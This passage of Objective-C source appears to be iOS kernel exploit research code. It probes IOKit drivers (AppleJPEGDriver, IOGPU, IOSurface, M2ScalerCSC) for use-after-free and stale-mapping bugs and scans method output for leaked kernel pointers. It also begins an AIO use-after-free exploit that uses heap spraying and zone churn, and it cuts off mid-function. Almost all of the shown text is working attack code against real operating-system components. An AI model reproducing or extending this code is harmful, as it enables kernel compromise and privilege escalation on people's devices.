                socklen_t len = sizeof(buf);
                memset(buf, 0xCC, sizeof(buf));
                int r = getsockopt(tcp, IPPROTO_IPV6, opt, buf, &len);
                if (r == 0 && len > 0) {
                    int changed = 0;
                    for (int i = 0; i < (int)len; i++) if (buf[i] != 0xCC) changed++;
                    if (changed > 0) {
                        [out appendFormat:@"opt=%d len=%d changed=%d\n", opt, len, changed];
                    }
                }
            }
            [out appendString:@"\n"];
            close(tcp);
        }

        int udp = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
        if (udp >= 0) {
            [out appendString:@"UDP socket: "];
            for (int opt = 0; opt <= 30; opt++) {
                uint8_t buf[4096];
                socklen_t len = sizeof(buf);
                memset(buf, 0xDD, sizeof(buf));
                int r = getsockopt(udp, IPPROTO_IPV6, opt, buf, &len);
                if (r == 0 && len > 0) {
                    int changed = 0;
                    for (int i = 0; i < (int)len; i++) if (buf[i] != 0xDD) changed++;
                    if (changed > 0) {
                        [out appendFormat:@"opt=%d len=%d changed=%d\n", opt, len, changed];
                    }
                }
            }
            [out appendString:@"\n"];
            close(udp);
        }
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// #1: P008 JPEG session setup + IOConnectMapMemory64
// The crash before was likely because no session was set up.
// With sel=0 (OpenJPEG) first, the driver might support mapping.
+ (NSString *)runP008SessionMap {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P008 JPEG Session + Map ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef kern_return_t (*MapMem64_t)(io_connect_t, uint32_t, uint64_t *, uint64_t *, kern_return_t *);
    MapMem64_t pMapMem = dlsym(iokit, "IOConnectMapMemory64");

    io_service_t svc = pGet(*pMainPort, pMatching("AppleJPEGDriver"));
    if (!svc) { [out appendString:@"no JPEG\nDONE -- paste this text back\n"]; return out; }

    io_connect_t conn = 0;
    kern_return_t kr = pOpen(svc, mach_task_self(), 0, &conn);
    if (!conn) { [out appendFormat:@"open rc=0x%08x\n", (unsigned)kr]; pRelease(svc); return out; }
    [out appendFormat:@"conn=%u\n", conn];

    // Step 1: Open JPEG session (sel=0)
    {
        uint64_t inS[1] = {0};
        kern_return_t r = pCall(conn, 0, inS, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"OpenJPEG sel=0 rc=0x%08x\n", (unsigned)r];
    }

    // Step 2: Try sel=5 (SubmitDecodeBlt) with dummy data to set up decode state
    {
        // Minimal decode params: just enough to set up state
        uint8_t decodeStruct[0x100];
        memset(decodeStruct, 0, sizeof(decodeStruct));
        // Set some basic fields: width=64, height=64, format=2 (YUV)
        *(uint32_t *)(decodeStruct + 0) = 64;   // width
        *(uint32_t *)(decodeStruct + 4) = 64;   // height
        *(uint32_t *)(decodeStruct + 8) = 2;    // format
        size_t structCnt = sizeof(decodeStruct);
        kern_return_t r = pCall(conn, 5, NULL, 0, decodeStruct, structCnt, NULL, NULL, NULL, NULL);
        [out appendFormat:@"SubmitDecode sel=5 rc=0x%08x\n", (unsigned)r];
    }

    // Step 3: Now try IOConnectMapMemory64 with session active
    if (pMapMem) {
        [out appendString:@"\n--- IOConnectMapMemory64 (with session) ---\n"];
        for (uint32_t type = 0; type <= 20; type++) {
            uint64_t addr = 0, sz = 0;
            kern_return_t r = pMapMem(conn, type, &addr, &sz, NULL);
            if (r == 0 && addr != 0) {
                [out appendFormat:@"type=%u: addr=0x%llx size=0x%llx\n", type, addr, sz];
                volatile uint32_t *p = (volatile uint32_t *)addr;
                uint32_t val = *p;
                [out appendFormat:@"  read [0]=0x%08x\n", val];

                // Close — stale mapping?
                pClose(conn);
                conn = 0;
                uint32_t val2 = *p;
                [out appendFormat:@"  after close: 0x%08x\n", val2];
                if (val != val2) [out appendString:@"  *** STALE! ***\n"];
                *p = 0xDEADBEEF;
                [out appendFormat:@"  write: 0x%08x\n", *p];

                pRelease(svc);
                [out appendString:@"\nDONE -- paste this text back\n"];
                return out;
            }
        }
        [out appendString:@"no mapping succeeded (even with session)\n"];
    }

    if (conn) pClose(conn);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// #2: Metal + IOConnectMapMemory64
// Create Metal device (sets up GPU state), then try mapping on our own IOGPU conn
+ (NSString *)runMetalMap {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== Metal + IOGPU Map ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { [out appendString:@"STOP\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef kern_return_t (*MapMem64_t)(io_connect_t, uint32_t, uint64_t *, uint64_t *, kern_return_t *);
    MapMem64_t pMapMem = dlsym(iokit, "IOConnectMapMemory64");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    // Step 1: Create Metal device (sets up GPU state internally)
    id<MTLDevice> mtlDevice = MTLCreateSystemDefaultDevice();
    if (!mtlDevice) {
        [out appendString:@"no Metal device\nDONE -- paste this text back\n"];
        return out;
    }
    [out appendString:@"Metal device created (GPU state active)\n"];

    // Step 2: Create our own IOGPU connection (while Metal state is active)
    io_service_t svc = pGet(*pMainPort, pMatching("IOGPU"));
    if (!svc) { [out appendString:@"no IOGPU\n"]; return out; }

    void *dev = pDevCreate(svc);
    io_connect_t conn = dev ? pGetConn(dev) : 0;
    if (!conn) {
        // Fallback: direct open
        pOpen(svc, mach_task_self(), 0, &conn);
    }
    [out appendFormat:@"our conn=%u\n", conn];
    if (!conn) { pRelease(svc); return out; }

    // Set up queue
    void *args = calloc(1, 0x410);
    if (dev) {
        *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    }
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    uint32_t qid = pGetID ? pGetID(queue) : 0;
    [out appendFormat:@"qid=%u\n", qid];

    // Step 3: Submit a command (sel=8) to activate GPU state
    {
        uint64_t s[1] = {qid};
        kern_return_t r = pCall(conn, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"sel=8 rc=0x%08x\n", (unsigned)r];
    }

    // Step 4: Try IOConnectMapMemory64 with Metal state active
    if (pMapMem) {
        [out appendString:@"\n--- IOConnectMapMemory64 (with Metal active) ---\n"];
        for (uint32_t type = 0; type <= 20; type++) {
            uint64_t addr = 0, sz = 0;
            kern_return_t r = pMapMem(conn, type, &addr, &sz, NULL);
            if (r == 0 && addr != 0) {
                [out appendFormat:@"type=%u: addr=0x%llx size=0x%llx\n", type, addr, sz];
                volatile uint32_t *p = (volatile uint32_t *)addr;
                uint32_t val = *p;
                [out appendFormat:@"  read [0]=0x%08x\n", val];

                pClose(conn);
                conn = 0;
                uint32_t val2 = *p;
                [out appendFormat:@"  after close: 0x%08x\n", val2];
                if (val != val2) [out appendString:@"  *** STALE! ***\n"];
                *p = 0xDEADBEEF;
                [out appendFormat:@"  write: 0x%08x\n", *p];

                if (dev && pDevRelease) pDevRelease(dev);
                pRelease(svc);
                [out appendString:@"\nDONE -- paste this text back\n"];
                return out;
            }
        }
        [out appendString:@"no mapping succeeded (even with Metal)\n"];
    }

    if (conn) pClose(conn);
    if (dev && pDevRelease) pDevRelease(dev);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// #3: IOGPU Notification UAF
+ (NSString *)runP010NotifyUAF {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 Notification UAF ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef void *IONotificationPortRef;
    typedef IONotificationPortRef (*CreateNotify_t)(mach_port_t);
    typedef kern_return_t (*AddInterest_t)(IONotificationPortRef, mach_port_t,
        io_service_t, const char *, mach_port_t, uintptr_t,
        void *, void *, io_iterator_t *);
    typedef void (*DestroyNotify_t)(IONotificationPortRef);
    typedef mach_port_t (*GetMachPort_t)(IONotificationPortRef);

    CreateNotify_t pCreateNotify = dlsym(iokit, "IONotificationPortCreate");
    AddInterest_t pAddInterest = dlsym(iokit, "IOServiceAddInterestNotification");
    DestroyNotify_t pDestroyNotify = dlsym(iokit, "IONotificationPortDestroy");
    GetMachPort_t pGetMachPort = dlsym(iokit, "IONotificationPortGetMachPort");

    if (!pCreateNotify || !pAddInterest) {
        [out appendString:@"no notify API\nDONE -- paste this text back\n"];
        return out;
    }

    // Use global C callback (blocks can't be passed as C function pointers)
    g_notifyFired = 0;

    io_service_t svc = pGet(*pMainPort, pMatching("IOGPU"));
    if (!svc) { [out appendString:@"no IOGPU\n"]; return out; }

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    // Use IOGPUDeviceCreate (not IOServiceOpen) — IOServiceOpen type=0 fails
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    DevCreate_t pDevCreate = iogpu ? dlsym(iogpu, "IOGPUDeviceCreate") : NULL;
    GetConn_t pGetConn = iogpu ? dlsym(iogpu, "IOGPUDeviceGetConnect") : NULL;
    DevRelease_t pDevRelease = iogpu ? dlsym(iogpu, "IOGPUDeviceRelease") : NULL;

    io_connect_t conn = 0;
    void *dev = NULL;
    if (pDevCreate) {
        dev = pDevCreate(svc);
        conn = dev && pGetConn ? pGetConn(dev) : 0;
    }
    if (!conn) {
        // Fallback to direct open
        kern_return_t kr = pOpen(svc, mach_task_self(), 0, &conn);
        [out appendFormat:@"IOServiceOpen rc=0x%08x\n", (unsigned)kr];
    }
    [out appendFormat:@"conn=%u\n", conn];
    if (!conn) { pRelease(svc); return out; }

    IONotificationPortRef notifyPort = pCreateNotify(*pMainPort);
    [out appendFormat:@"notifyPort=%p\n", notifyPort];

    // Register for "IOServiceTerminated" interest
    io_iterator_t iter = 0;
    kern_return_t r = pAddInterest(notifyPort, *pMainPort, svc,
        "IOServiceTerminated", 0, 0,
                                   (void *)luminaNotifyCallback, (void *)0x1234, &iter);
    [out appendFormat:@"addInterest rc=0x%08x iter=%u\n", (unsigned)r, iter];

    // Set up queue + submit command (sel=8)
    {
        uint64_t s[1] = {0};
        kern_return_t r8 = pCall(conn, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"sel=8 rc=0x%08x\n", (unsigned)r8];
    }

    // Now close the connection — notification may fire with freed data
    [out appendString:@"\nclosing conn...\n"];
    pClose(conn);
    conn = 0;

    // Wait for notification to fire
    for (int i = 0; i < 50; i++) {
        usleep(100000); // 100ms
        if (g_notifyFired) break;
    }

    [out appendFormat:@"notifyFired=%d refcon=0x%lx\n",
        g_notifyFired, (unsigned long)g_notifyRefcon];

    if (g_notifyFired) {
        [out appendString:@"*** NOTIFICATION FIRED AFTER CLOSE ***\n"];
        [out appendString:@"potential UAF — notification accessed freed service\n"];
    } else {
        [out appendString:@"no notification fired (no UAF window)\n"];
    }

    // Try with type=1 connection too
    io_connect_t conn1 = 0;
    kern_return_t kr2 = pOpen(svc, mach_task_self(), 1, &conn1);
    [out appendFormat:@"\ntype=1 conn=%u rc=0x%08x\n", conn1, (unsigned)kr2];
    if (conn1) {
        io_iterator_t iter2 = 0;
        g_notifyFired = 0;
        r = pAddInterest(notifyPort, *pMainPort, svc,
            "IOServiceTerminated", 0, 0,
            (void *)luminaNotifyCallback, (void *)0x5678, &iter2);
        [out appendFormat:@"addInterest2 rc=0x%08x\n", (unsigned)r];

        pClose(conn1);
        for (int i = 0; i < 30; i++) {
            usleep(100000);
            if (g_notifyFired) break;
        }
        [out appendFormat:@"type1 notifyFired=%d\n", g_notifyFired];
        if (g_notifyFired) [out appendString:@"*** TYPE1 UAF WINDOW ***\n"];
    }

    if (pDestroyNotify) pDestroyNotify(notifyPort);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// #4: AppleM2ScalerCSCDriver deep probe (CVE-2025-43510 COW race target)
+ (NSString *)runM2ScalerProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== M2ScalerCSC Probe ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    const char *names[] = {"AppleM2ScalerCSCDriver", "AppleM2ScalerCSCDriverUserClient",
                          "IOVideoScalerUserClient", "AppleJPEGDriver", NULL};
    io_service_t svc = 0;
    const char *found = NULL;
    for (int i = 0; names[i]; i++) {
        svc = pGet(*pMainPort, pMatching(names[i]));
        if (svc) { found = names[i]; break; }
    }
    if (!svc) { [out appendString:@"no M2Scaler/JPEG svc\nDONE -- paste this text back\n"]; return out; }
    [out appendFormat:@"svc=%s\n", found];

    // Try open types 0-3
    for (uint32_t ot = 0; ot <= 3; ot++) {
        io_connect_t conn = 0;
        kern_return_t kr = pOpen(svc, mach_task_self(), ot, &conn);
        if (!conn) {
            [out appendFormat:@"type=%u open rc=0x%08x\n", ot, (unsigned)kr];
            continue;
        }
        [out appendFormat:@"\ntype=%u conn=%u\n", ot, conn];

        // Selector sweep 0-30
        for (uint32_t sel = 0; sel <= 30; sel++) {
            uint64_t outS[8];
            uint32_t outSCnt = 8;
            uint8_t outStr[0x100];
            size_t outStrCnt = 0x100;
            kern_return_t r = pCall(conn, sel, NULL, 0, NULL, 0,
                outS, &outSCnt, outStr, &outStrCnt);
            if (r == 0) {
                [out appendFormat:@"  sel=%u OK outS=%u outStr=%zu",
                    sel, outSCnt, outStrCnt];
                if (outSCnt >= 1) [out appendFormat:@" s0=0x%llx", outS[0]];
                if (outSCnt >= 2) [out appendFormat:@" s1=0x%llx", outS[1]];
                // Check for kernel pointers (high bits set)
                for (uint32_t j = 0; j < outSCnt; j++) {
                    if (outS[j] > 0xffff800000000000ULL) {
                        [out appendFormat:@" *** KPTR s%u ***", j];
                    }
                }
                [out appendString:@"\n"];
            } else if (r != 0xe00002c2 && r != 0xe00002c1) {
                // Not "no such selector" / "bad argument"
                [out appendFormat:@"  sel=%u rc=0x%08x\n", sel, (unsigned)r];
            }
        }

        // Try with input scalar {1} — some methods need it
        [out appendString:@"  -- with input scalar 1 --\n"];
        for (uint32_t sel = 0; sel <= 15; sel++) {
            uint64_t inS[1] = {1};
            uint64_t outS[4];
            uint32_t outSCnt = 4;
            kern_return_t r = pCall(conn, sel, inS, 1, NULL, 0,
                outS, &outSCnt, NULL, NULL);
            if (r == 0) {
                [out appendFormat:@"  sel=%u(1) OK s0=0x%llx s1=0x%llx\n",
                    sel, outSCnt > 0 ? outS[0] : 0, outSCnt > 1 ? outS[1] : 0];
            }
        }

        pClose(conn);
    }

    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// #5: IOSurface + IOGPU cross-connection UAF
+ (NSString *)runIOSurfaceCrossUAF {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== IOSurface + IOGPU Cross UAF ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosurf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iosurf || !iogpu) { [out appendString:@"STOP\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    // IOSurface creation
    typedef void *IOSurfaceRef;
    typedef IOSurfaceRef (*SurfCreate_t)(CFDictionaryRef);
    typedef uint32_t (*SurfGetID_t)(IOSurfaceRef);
    typedef void (*SurfRelease_t)(IOSurfaceRef);
    SurfCreate_t pSurfCreate = dlsym(iosurf, "IOSurfaceCreate");
    SurfGetID_t pSurfGetID = dlsym(iosurf, "IOSurfaceGetID");
    SurfRelease_t pSurfRelease = dlsym(iosurf, "IOSurfaceRelease");

    // IOGPU
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");

    if (!pSurfCreate || !pDevCreate) {
        [out appendString:@"missing API\nDONE -- paste this text back\n"];
        return out;
    }

    // Step 1: Create IOSurface (64x64, BGRA)
    int w = 64, h = 64;
    CFNumberRef wN = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef hN = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef fN = CFNumberCreate(NULL, kCFNumberIntType, (int[]){32}); // BGRA8
    CFNumberRef pN = CFNumberCreate(NULL, kCFNumberIntType, (int[]){w*4});
    const void *keys[] = {
        CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
        CFSTR("IOSurfacePixelFormat"), CFSTR("IOSurfaceBytesPerRow")
    };
    const void *vals[] = { wN, hN, fN, pN };
    CFDictionaryRef dict = CFDictionaryCreate(NULL, keys, vals, 4, NULL, NULL);
    IOSurfaceRef surf = pSurfCreate(dict);
    CFRelease(dict); // keep wN, hN, fN for the race loop below

    if (!surf) { [out appendString:@"no surface\nDONE -- paste this text back\n"]; return out; }
    uint32_t surfID = pSurfGetID(surf);
    [out appendFormat:@"surface id=%u\n", surfID];

    // Step 2: Create 2 IOGPU connections
    io_service_t svc = pGet(*pMainPort, pMatching("IOGPU"));
    if (!svc) { pSurfRelease(surf); [out appendString:@"no IOGPU\n"]; return out; }

    void *devA = pDevCreate(svc);
    io_connect_t connA = devA ? pGetConn(devA) : 0;
    void *devB = pDevCreate(svc);
    io_connect_t connB = devB ? pGetConn(devB) : 0;
    [out appendFormat:@"connA=%u connB=%u\n", connA, connB];
    if (!connA || !connB) {
        if (connA) pClose(connA);
        if (connB) pClose(connB);
        if (devA && pDevRelease) pDevRelease(devA);
        if (devB && pDevRelease) pDevRelease(devB);
        pSurfRelease(surf);
        pRelease(svc);
        return out;
    }

    // Step 3: Try to bind surface to connA (sel=8 with surface ID)
    {
        uint64_t s[1] = {surfID};
        kern_return_t r = pCall(connA, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"connA sel=8(surfID) rc=0x%08x\n", (unsigned)r];
    }

    // Step 4: Try sel=42 on connA with surface ID (type=1 specific)
    {
        uint64_t s[1] = {surfID};
        kern_return_t r = pCall(connA, 42, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"connA sel=42(surfID) rc=0x%08x\n", (unsigned)r];
    }

    // Step 5: Close connA (surface may still be bound)
    [out appendString:@"\nclosing connA...\n"];
    pClose(connA);
    connA = 0;

    // Step 6: Try to access surface from connB
    [out appendString:@"accessing from connB...\n"];
    {
        uint64_t s[1] = {surfID};
        kern_return_t r = pCall(connB, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"connB sel=8(surfID) rc=0x%08x\n", (unsigned)r];
    }
    {
        uint64_t s[1] = {surfID};
        kern_return_t r = pCall(connB, 42, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"connB sel=42(surfID) rc=0x%08x\n", (unsigned)r];
    }

    // Step 7: Lock surface and read — check for stale data
    typedef void *(*SurfLock_t)(IOSurfaceRef, uint32_t, uint32_t *, uint32_t *, uint32_t *, uint32_t *, uint32_t *, uint32_t *);
    SurfLock_t pSurfLock = dlsym(iosurf, "IOSurfaceLock");
    typedef void (*SurfUnlock_t)(IOSurfaceRef, uint32_t, void *);
    SurfUnlock_t pSurfUnlock = dlsym(iosurf, "IOSurfaceUnlock");

    if (pSurfLock) {
        uint32_t seed = 0;
        void *base = pSurfLock(surf, 0, &seed, NULL, NULL, NULL, NULL, NULL);
        [out appendFormat:@"surface base=%p seed=%u\n", base, seed];
        if (base) {
            uint32_t val = *(volatile uint32_t *)base;
            [out appendFormat:@"  read [0]=0x%08x\n", val];
            *(volatile uint32_t *)base = 0xDEADBEEF;
            [out appendFormat:@"  wrote 0xDEADBEEF\n"];
            uint32_t val2 = *(volatile uint32_t *)base;
            [out appendFormat:@"  read back=0x%08x\n", val2];
            if (pSurfUnlock) pSurfUnlock(surf, 0, base);
        }
    }

    // Step 8: Race — create N surfaces, bind to conn, close conn, access from other
    [out appendString:@"\n--- race: 20 iterations ---\n"];
    int uafCount = 0;
    // Build dict for loop surfaces (reuse wN, hN, fN which are still alive)
    const void *lkeys[] = {
        CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
        CFSTR("IOSurfacePixelFormat")
    };
    const void *lvals[] = { wN, hN, fN };
    for (int i = 0; i < 20; i++) {
        CFDictionaryRef d2 = CFDictionaryCreate(NULL, lkeys, lvals, 3, NULL, NULL);
        if (!d2) continue;
        IOSurfaceRef s2 = pSurfCreate(d2);
        CFRelease(d2);
        if (!s2) continue;
        uint32_t sid = pSurfGetID(s2);

        void *devC = pDevCreate(svc);
        io_connect_t connC = devC ? pGetConn(devC) : 0;
        if (!connC) { pSurfRelease(s2); continue; }

        uint64_t ss[1] = {sid};
        pCall(connC, 8, ss, 1, NULL, 0, NULL, NULL, NULL, NULL);
        pClose(connC);
        if (devC && pDevRelease) pDevRelease(devC);

        // Try connB on same surface
        kern_return_t r = pCall(connB, 8, ss, 1, NULL, 0, NULL, NULL, NULL, NULL);
        if (r == 0) uafCount++;
        pSurfRelease(s2);
    }
    [out appendFormat:@"uafCount=%d/20\n", uafCount];
    if (uafCount > 0) [out appendString:@"*** CROSS-CONN ACCESS AFTER CLOSE ***\n"];

    if (connB) pClose(connB);
    if (devA && pDevRelease) pDevRelease(devA);
    if (devB && pDevRelease) pDevRelease(devB);
    pSurfRelease(surf);
    CFRelease(wN); CFRelease(hN); CFRelease(fN); CFRelease(pN);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// Snippets INLINED (was *.inc.h) — fixes Xcode "Missing context" forever.

// ==== BEGIN inlined AIOUAFProbe.inc.h ====
// AIOUAFProbe v4c — S3 + zone CHURN then close(keep).
//
// v4b: dup-kq worked (knote survived zfree) but 6 one-shot sprays missed the
// slot (os_refcnt underflow on a zeroed object, NOT "still enqueued").
// aio_workq_entry is kalloc_type (kt_size=0xb8 on A14 23F77) + UAF quarantine;
// NOT generic data.kalloc / KHEAP_DATA. Per-proc cap 8 so we cannot
// brute-force with volume. Instead: after zfree, alloc/reap the 7 free slots
// in a tight loop to drain quarantine, then leave 7 LIVE on doneq and close(keep).
//
// Hit  = "still enqueued" (extra-unref of a live doneq entry still on the list)
// Miss = underflow again (knote still on the quarantined slot)
//
// NOTE: no #includes here — headers live at the top of AVEOpenSmoke.m.

#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4
#endif

#define AIO_SPRAY 7
#define AIO_CHURN 2500
#define AIO_ITERS 80

static volatile int  g_v4_stop = 0;
static volatile int  g_v4_lookup = -1;
static volatile int  g_v4_do_close = 0;
static volatile long g_v4_closes = 0;

static int g_v4_file = -1;
static uint8_t g_v4_buf[64];

static void v4_pin(int tag) {
    thread_t t = mach_thread_self();
    thread_affinity_policy_data_t p = { .affinity_tag = tag };
    thread_policy_set(t, THREAD_AFFINITY_POLICY, (thread_policy_t)&p,
                      THREAD_AFFINITY_POLICY_COUNT);
    mach_port_deallocate(mach_task_self(), t);
}

static void v4_fill_none(struct aiocb *cb) {
    memset(cb, 0, sizeof(*cb));
    cb->aio_fildes = g_v4_file;
    cb->aio_buf = g_v4_buf;
    cb->aio_nbytes = 1;
    cb->aio_sigevent.sigev_notify = SIGEV_NONE;
}

static void v4_fill_kevent(struct aiocb *cb, int kq) {
    memset(cb, 0, sizeof(*cb));
    cb->aio_fildes = g_v4_file;
    cb->aio_buf = g_v4_buf;
    cb->aio_nbytes = 1;
    cb->aio_sigevent.sigev_notify = SIGEV_KEVENT;
    cb->aio_sigevent.sigev_signo = kq;
}

static int v4_read(struct aiocb *cb) {
    int rc = aio_read(cb);
    if (rc != 0 && errno == EINVAL)
        rc = (int)syscall(SYS_aio_read, cb);
    return rc;
}

static void v4_reap(struct aiocb *cb) {
    aio_cancel(cb->aio_fildes, cb);
    for (int i = 0; i < 100000; i++) {
        int e = aio_error(cb);
        if (e != EINPROGRESS) break;
    }
    aio_return(cb);
}

static int v4_burst_alloc(struct aiocb *spray, int n) {
    int got = 0;
    for (int i = 0; i < n; i++) {
        v4_fill_none(&spray[i]);
        if (v4_read(&spray[i]) == 0) got++;
        else v4_reap(&spray[i]);
    }
    return got;
}

static void v4_burst_reap(struct aiocb *spray, int n) {
    for (int i = 0; i < n; i++) v4_reap(&spray[i]);
}

static void *v4_closer(void *arg) {
    (void)arg;
    v4_pin(3);
    while (!g_v4_stop) {
        if (g_v4_do_close) {
            int fd = g_v4_lookup;
            if (fd >= 0) {
                g_v4_lookup = -1;
                close(fd);
                g_v4_closes++;
            }
        }
    }
    return NULL;
}

+ (NSString *)runAIOUAF {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== AIO UAF v4c (S3 + zone CHURN then close(keep)) ===\n"];
    [out appendString:@"NOTE: aio_workq_entry = kalloc_type kt_size=0xb8 (23F77); NOT data.kalloc\n"];
    [out appendFormat:@"churn %d cycles x %d slots, then 7 live doneq, close(keep).\n\n",
        AIO_CHURN, AIO_SPRAY];

